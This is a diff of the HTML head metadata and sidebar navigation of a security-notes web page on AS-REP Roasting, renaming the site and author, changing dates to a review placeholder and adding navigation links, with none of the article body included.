@@ -3,11 +3,14 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>AS-REP Roasting - Identity &amp; Active Directory | ldamoredev Security Atlas</title>
+<title>AS-REP Roasting - Identity &amp; Active Directory | Cybersecurity Atlas</title>
 <meta name="description" content="AS-REP Roasting is an Active Directory credential attack where an attacker exploits accounts with **Kerberos pre-authentication disabled** by sending an AS-REQ...">
-<meta name="author" content="ldamoredev">
-<meta name="keywords" content="cybersecurity, web security, API security, cloud security, offensive security, DevSecOps, security playbooks, Identity &amp; Active Directory, AS-REP Roasting, offensive-security, active-directory, kerberos, as-rep-roasting, credential-attack">
-<meta name="theme-color" content="#16a34a">
+<meta name="author" content="Lautaro Damore">
+<meta name="application-name" content="Cybersecurity Atlas">
+<meta name="keywords" content="cybersecurity, web security, API security, cloud security, offensive security, DevSecOps, security playbooks, Identity &amp; Active Directory, AS-REP Roasting">
+<meta name="theme-color" content="#43D17A">
+<meta name="color-scheme" content="light dark">
+<meta name="referrer" content="strict-origin-when-cross-origin">
 <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
 <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
 <link rel="canonical" href="https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html">
@@ -15,23 +18,26 @@
 <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
 <link rel="apple-touch-icon" href="../../../apple-touch-icon.png">
 <link rel="manifest" href="../../../site.webmanifest">
-<meta property="article:section" content="Identity &amp; Active Directory">
-<meta property="og:site_name" content="ldamoredev Security Atlas">
+<meta property="og:site_name" content="Cybersecurity Atlas">
 <meta property="og:locale" content="en_US">
 <meta property="og:locale:alternate" content="es_ES">
 <meta property="og:type" content="article">
-<meta property="og:title" content="AS-REP Roasting - Identity &amp; Active Directory | ldamoredev Security Atlas">
+<meta property="og:title" content="AS-REP Roasting - Identity &amp; Active Directory | Cybersecurity Atlas">
 <meta property="og:description" content="AS-REP Roasting is an Active Directory credential attack where an attacker exploits accounts with **Kerberos pre-authentication disabled** by sending an AS-REQ...">
 <meta property="og:url" content="https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html">
 <meta property="og:image" content="https://ldamoredev.github.io/cibersecurity-notes/assets/og-image.png">
+<meta property="og:image:type" content="image/png">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
-<meta property="og:image:alt" content="ldamoredev Security Atlas">
+<meta property="og:image:alt" content="Cybersecurity Atlas">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="AS-REP Roasting - Identity &amp; Active Directory | ldamoredev Security Atlas">
+<meta name="twitter:title" content="AS-REP Roasting - Identity &amp; Active Directory | Cybersecurity Atlas">
 <meta name="twitter:description" content="AS-REP Roasting is an Active Directory credential attack where an attacker exploits accounts with **Kerberos pre-authentication disabled** by sending an AS-REQ...">
 <meta name="twitter:image" content="https://ldamoredev.github.io/cibersecurity-notes/assets/og-image.png">
-<script type="application/ld+json">[{"@context":"https://schema.org","@type":"TechArticle","@id":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html#article","name":"AS-REP Roasting - Identity & Active Directory | ldamoredev Security Atlas","headline":"AS-REP Roasting","description":"AS-REP Roasting is an Active Directory credential attack where an attacker exploits accounts with **Kerberos pre-authentication disabled** by sending an AS-REQ...","url":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html","inLanguage":"en","datePublished":"2026-05-11","dateModified":"2026-05-11","mainEntityOfPage":{"@type":"WebPage","@id":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html"},"isPartOf":{"@type":"WebSite","@id":"https://ldamoredev.github.io/cibersecurity-notes/#website","name":"ldamoredev Security Atlas","url":"https://ldamoredev.github.io/cibersecurity-notes/"},"author":{"@type":"Person","@id":"https://ldamoredev.github.io/cibersecurity-notes/#author","name":"ldamoredev"},"keywords":["cybersecurity","web security","API security","cloud security","offensive security","DevSecOps","security playbooks","Identity & Active Directory","AS-REP Roasting","offensive-security","active-directory","kerberos","as-rep-roasting","credential-attack"]},{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://ldamoredev.github.io/cibersecurity-notes/en/"},{"@type":"ListItem","position":2,"name":"Cybersecurity","item":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/index.html"},{"@type":"ListItem","position":3,"name":"Identity & Active Directory","item":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/index.html"},{"@type":"ListItem","position":4,"name":"AS-REP Roasting","item":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html"}]}]</script>
+<script type="application/ld+json">[{"@context":"https://schema.org","@type":"TechArticle","@id":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html#article","name":"AS-REP Roasting - Identity & Active Directory | Cybersecurity Atlas","headline":"AS-REP Roasting","description":"AS-REP Roasting is an Active Directory credential attack where an attacker exploits accounts with **Kerberos pre-authentication disabled** by sending an AS-REQ...","url":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html","inLanguage":"en","datePublished":"editorial review needed","dateModified":"editorial review needed","mainEntityOfPage":{"@type":"WebPage","@id":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html"},"isPartOf":{"@type":"WebSite","@id":"https://ldamoredev.github.io/cibersecurity-notes/#website","name":"Cybersecurity Atlas","url":"https://ldamoredev.github.io/cibersecurity-notes/"},"author":{"@type":"Person","@id":"https://ldamoredev.github.io/cibersecurity-notes/#author","name":"Lautaro Damore"},"keywords":["cybersecurity","web security","API security","cloud security","offensive security","DevSecOps","security playbooks","Identity & Active Directory","AS-REP Roasting"]},{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://ldamoredev.github.io/cibersecurity-notes/en/"},{"@type":"ListItem","position":2,"name":"Cybersecurity","item":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/index.html"},{"@type":"ListItem","position":3,"name":"Identity & Active Directory","item":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/index.html"},{"@type":"ListItem","position":4,"name":"AS-REP Roasting","item":"https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html"}]}]</script>
+<meta property="article:section" content="Identity &amp; Active Directory">
+<meta property="article:published_time" content="editorial review needed">
+<meta property="article:modified_time" content="editorial review needed">
 <link rel="alternate" hreflang="en" href="https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html">
 <link rel="alternate" hreflang="es" href="https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/as-rep-roasting.html">
 <link rel="alternate" hreflang="x-default" href="https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/as-rep-roasting.html">
@@ -39,13 +45,13 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap">
 <script>(function(){try{var t=localStorage.getItem('theme');if(!t)t=matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';document.documentElement.setAttribute('data-theme',t);}catch(e){}})();</script>
-<link rel="stylesheet" href="../../../assets/style.css?v=6d139dc885">
-<link rel="stylesheet" href="../../../assets/pygments.css?v=6d139dc885">
+<link rel="stylesheet" href="../../../assets/style.css?v=99fbda06b7">
+<link rel="stylesheet" href="../../../assets/pygments.css?v=99fbda06b7">
 </head>
 <body id="top" data-root="../../.." data-locale-root="../..">
-<div class="app with-toc">
+<div class="app no-toc">
 <nav class="sidebar">
-<div class="sidebar-head"><a class="sidebar-brand" href="../../index.html"><span class="brand-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg></span><span class="brand-text"><span class="brand-title">CyberSec Atlas</span><span class="brand-sub">Knowledge Base</span></span></a><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle theme"><span class="theme-label"><span class="label-light"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>Light mode</span><span class="label-dark"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>Dark mode</span></span><span class="toggle-pill"></span></button></div>
+<div class="sidebar-head"><a class="sidebar-brand" href="../../index.html"><span class="brand-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg></span><span class="brand-text"><span class="brand-title">CyberSec Atlas</span><span class="brand-sub">Attack Surface &amp; Signal</span></span></a><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle theme"><span class="theme-label"><span class="label-light"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>Light mode</span><span class="label-dark"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>Dark mode</span></span><span class="toggle-pill"></span></button></div>
 <div class="sidebar-body">
 <a class="sidebar-home" href="../../index.html">Atlas Home</a>
 <div class="sidebar-section"><h3>Entry layer</h3>
@@ -56,21 +62,24 @@
 <a class="sidebar-link kind-concept" href="../phase-2-offense-defense.html">Phase 2 — Offense / Defense (Paired)</a>
 <a class="sidebar-link kind-concept" href="../phase-3-operator.html">Phase 3 — Operator Surface (Concept → Capability)</a>
 <a class="sidebar-link kind-concept" href="../phase-4-specialty.html">Phase 4 — Specialty Tracks (Pick What Your Job Demands)</a>
+<a class="sidebar-link kind-lab" href="../atlas-security-range.html">Atlas Security Range</a>
 </div>
 <div class="sidebar-section"><h3>Learning Path</h3>
-<details class="nav-group"><summary><span class="ns-left"><svg class="sec-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg><span class="ns-name"><span class="ns-num">00</span>Orientation</span></span><span class="ns-right"><span class="count">8</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-children">
-<details class="nav-branch accent-amber"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg><span class="nb-name">Foundations</span></span><span class="nb-right"><span class="count">8</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
+<details class="nav-group"><summary><span class="ns-left"><svg class="sec-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg><span class="ns-name"><span class="ns-num">00</span>Orientation</span></span><span class="ns-right"><span class="count">10</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-children">
+<details class="nav-branch accent-amber"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg><span class="nb-name">Foundations</span></span><span class="nb-right"><span class="count">10</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
 <a class="nav-leaf nav-leaf-overview" href="../foundations/index.html">Overview</a>
 <a class="nav-leaf" href="../foundations/attacker-defender-duality-as-a-learning-tool.html" title="Attacker-Defender Duality as a Learning Tool">Attacker-Defender Duality as a Learning Tool</a>
 <a class="nav-leaf" href="../foundations/certifications-as-validation-signals.html" title="Certifications as Validation Signals">Certifications as Validation Signals</a>
 <a class="nav-leaf" href="../foundations/cia-triad-and-what-it-actually-decides.html" title="CIA Triad — What It Actually Decides">CIA Triad — What It Actually Decides</a>
 <a class="nav-leaf" href="../foundations/job-context-specialization.html" title="Job Context Specialization">Job Context Specialization</a>
 <a class="nav-leaf" href="../foundations/minimum-viable-cybersecurity-literacy.html" title="Minimum Viable Cybersecurity Literacy">Minimum Viable Cybersecurity Literacy</a>
+<a class="nav-leaf" href="../foundations/security-boundaries-and-trust-assumptions.html" title="Security boundaries and trust assumptions">Security boundaries and trust assumptions</a>
+<a class="nav-leaf" href="../foundations/threat-modeling-from-asset-to-abuse-case.html" title="Threat modeling from asset to abuse case">Threat modeling from asset to abuse case</a>
 <a class="nav-leaf" href="../foundations/threat-modeling-quickstart.html" title="Threat Modeling Quickstart">Threat Modeling Quickstart</a>
 <a class="nav-leaf" href="../foundations/what-is-cybersecurity-and-why-it-is-not-a-tool-list.html" title="What Is Cybersecurity, and Why It Is Not a Tool List">What Is Cybersecurity, and Why It Is Not a Tool List</a>
 </div></details>
 </div></details>
-<details class="nav-group"><summary><span class="ns-left"><svg class="sec-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg><span class="ns-name"><span class="ns-num">01</span>Substrate</span></span><span class="ns-right"><span class="count">68</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-children">
+<details class="nav-group"><summary><span class="ns-left"><svg class="sec-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg><span class="ns-name"><span class="ns-num">01</span>Substrate</span></span><span class="ns-right"><span class="count">70</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-children">
 <details class="nav-branch accent-emerald"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><span class="nb-name">Cryptography</span></span><span class="nb-right"><span class="count">15</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
 <a class="nav-leaf nav-leaf-overview" href="../cryptography/index.html">Overview</a>
 <a class="nav-leaf" href="../cryptography/aead-and-nonce-misuse.html" title="AEAD and Nonce Misuse">AEAD and Nonce Misuse</a>
@@ -88,7 +97,7 @@
 <a class="nav-leaf" href="../cryptography/symmetric-encryption-modes.html" title="Symmetric Encryption Modes">Symmetric Encryption Modes</a>
 <a class="nav-leaf" href="../cryptography/tls-handshake-and-pki.html" title="TLS Handshake and PKI">TLS Handshake and PKI</a>
 </div></details>
-<details class="nav-branch accent-sky"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg><span class="nb-name">Networking</span></span><span class="nb-right"><span class="count">23</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
+<details class="nav-branch accent-sky"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg><span class="nb-name">Networking</span></span><span class="nb-right"><span class="count">24</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
 <a class="nav-leaf nav-leaf-overview" href="../networking/index.html">Overview</a>
 <a class="nav-leaf" href="../networking/caching-and-security.html" title="Caching and Security">Caching and Security</a>
 <a class="nav-leaf" href="../networking/client-ip-trust.html" title="Client IP Trust">Client IP Trust</a>
@@ -98,6 +107,7 @@
 <a class="nav-leaf" href="../networking/dns-resolution.html" title="DNS Resolution">DNS Resolution</a>
 <a class="nav-leaf" href="../networking/dns-security.html" title="DNS Security">DNS Security</a>
 <a class="nav-leaf" href="../networking/firewalls-and-network-boundaries.html" title="Firewalls and Network Boundaries">Firewalls and Network Boundaries</a>
+<a class="nav-leaf" href="../networking/from-browser-request-to-server-evidence.html" title="From browser request to server evidence">From browser request to server evidence</a>
 <a class="nav-leaf" href="../networking/header-trust-in-node-express.html" title="Header Trust in Node Express">Header Trust in Node Express</a>
 <a class="nav-leaf" href="../networking/http-headers.html" title="HTTP Headers">HTTP Headers</a>
 <a class="nav-leaf" href="../networking/http-messages.html" title="HTTP Messages">HTTP Messages</a>
@@ -113,9 +123,10 @@
 <a class="nav-leaf" href="../networking/tls-https.html" title="TLS and HTTPS">TLS and HTTPS</a>
 <a class="nav-leaf" href="../networking/wireshark-workflows.html" title="Wireshark Workflows">Wireshark Workflows</a>
 </div></details>
-<details class="nav-branch accent-blue"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg><span class="nb-name">Web Security</span></span><span class="nb-right"><span class="count">30</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
+<details class="nav-branch accent-blue"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg><span class="nb-name">Web Security</span></span><span class="nb-right"><span class="count">31</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
 <a class="nav-leaf nav-leaf-overview" href="../web-security/index.html">Overview</a>
 <a class="nav-leaf" href="../web-security/auth-flaws.html" title="Authentication Flaws">Authentication Flaws</a>
+<a class="nav-leaf" href="../web-security/authentication-authorization-and-object-access.html" title="Authentication, authorization and object access">Authentication, authorization and object access</a>
 <a class="nav-leaf" href="../web-security/bot-detection-signals.html" title="Bot Detection Signals">Bot Detection Signals</a>
 <a class="nav-leaf" href="../web-security/broken-access-control.html" title="Broken Access Control">Broken Access Control</a>
 <a class="nav-leaf" href="../web-security/browser-security-boundaries.html" title="Browser Security Boundaries">Browser Security Boundaries</a>
@@ -146,7 +157,7 @@
 <a class="nav-leaf" href="../web-security/xxe.html" title="XXE">XXE</a>
 </div></details>
 </div></details>
-<details class="nav-group"><summary><span class="ns-left"><svg class="sec-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="6" cy="6" r="3"/><circle cx="6" cy="18" r="3"/><path d="M18 8a4 4 0 0 0-4 4v3"/><line x1="6" y1="9" x2="6" y2="15"/><circle cx="18" cy="6" r="3"/></svg><span class="ns-name"><span class="ns-num">02</span>Paired</span></span><span class="ns-right"><span class="count">35</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-children">
+<details class="nav-group"><summary><span class="ns-left"><svg class="sec-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="6" cy="6" r="3"/><circle cx="6" cy="18" r="3"/><path d="M18 8a4 4 0 0 0-4 4v3"/><line x1="6" y1="9" x2="6" y2="15"/><circle cx="18" cy="6" r="3"/></svg><span class="ns-name"><span class="ns-num">02</span>Paired</span></span><span class="ns-right"><span class="count">36</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-children">
 <details class="nav-branch accent-rose"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg><span class="nb-name">Offensive Security / Recon</span></span><span class="nb-right"><span class="count">21</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
 <a class="nav-leaf nav-leaf-overview" href="../offensive-security/index.html">Overview</a>
 <a class="nav-leaf" href="../offensive-security/active-recon.html" title="Active Recon">Active Recon</a>
@@ -170,7 +181,7 @@
 <a class="nav-leaf" href="../offensive-security/tech-stack-fingerprinting.html" title="Tech Stack Fingerprinting">Tech Stack Fingerprinting</a>
 <a class="nav-leaf" href="../offensive-security/operator-loop.html" title="The Operator Loop">The Operator Loop</a>
 </div></details>
-<details class="nav-branch accent-cyan"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a10 10 0 0 1 10 10"/><line x1="12" y1="12" x2="20" y2="6"/></svg><span class="nb-name">Detection Engineering</span></span><span class="nb-right"><span class="count">14</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
+<details class="nav-branch accent-cyan"><summary><span class="nb-left"><svg class="nb-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a10 10 0 0 1 10 10"/><line x1="12" y1="12" x2="20" y2="6"/></svg><span class="nb-name">Detection Engineering</span></span><span class="nb-right"><span class="count">15</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-leaves">
 <a class="nav-leaf nav-leaf-overview" href="../detection-engineering/index.html">Overview</a>
 <a class="nav-leaf" href="../detection-engineering/attack-path-correlation-and-kill-chain-observability.html" title="Attack Path Correlation and Kill Chain Observability">Attack Path Correlation and Kill Chain Observability</a>
 <a class="nav-leaf" href="../detection-engineering/behavioral-detection-vs-signature-detection.html" title="Behavioral Detection vs Signature Detection">Behavioral Detection vs Signature Detection</a>
@@ -178,6 +189,7 @@
 <a class="nav-leaf" href="../detection-engineering/edr-network-observability-and-process-correlation.html" title="EDR Network Observability and Process Correlation">EDR Network Observability and Process Correlation</a>
 <a class="nav-leaf" href="../detection-engineering/encrypted-traffic-analysis-and-metadata-leakage.html" title="Encrypted Traffic Analysis and Metadata Leakage">Encrypted Traffic Analysis and Metadata Leakage</a>
 <a class="nav-leaf" href="../detection-engineering/false-positives-false-negatives-and-detection-tradeoffs.html" title="False Positives, False Negatives, and Detection Tradeoffs">False Positives, False Negatives, and Detection Trade…</a>
+<a class="nav-leaf" href="../detection-engineering/from-local-exploit-to-detection.html" title="From local exploit to detection">From local exploit to detection</a>
 <a class="nav-leaf" href="../detection-engineering/ids-ips-and-behavioral-detection-pipelines.html" title="IDS/IPS and Behavioral Detection Pipelines">IDS/IPS and Behavioral Detection Pipelines</a>
 <a class="nav-leaf" href="../detection-engineering/network-security-monitoring-discipline.html" title="Network Security Monitoring Discipline">Network Security Monitoring Discipline</a>
 <a class="nav-leaf" href="../detection-engineering/network-telemetry-sources-and-visibility.html" title="Network Telemetry Sources and Visibility">Network Telemetry Sources and Visibility</a>
@@ -187,7 +199,7 @@
 <a class="nav-leaf" href="../detection-engineering/zeek-suricata-and-netflow-analysis.html" title="Zeek, Suricata, and NetFlow Analysis">Zeek, Suricata, and NetFlow Analysis</a>
 </div></details>
 </div></details>
-<details class="nav-group"><summary><span class="ns-left"><svg class="sec-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg><span class="ns-name"><span class="ns-num">03</span>Operator</span></span><span class="ns-right"><span class="count">49</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-children">
+<details class="nav-group"><summary><span class="ns-left"><svg class="sec-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg><span class="ns-name"><span class="ns-num">03</span>Operator</span></span><span class="ns-right"><span class="count">50</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span></summary><div class="nav-children">
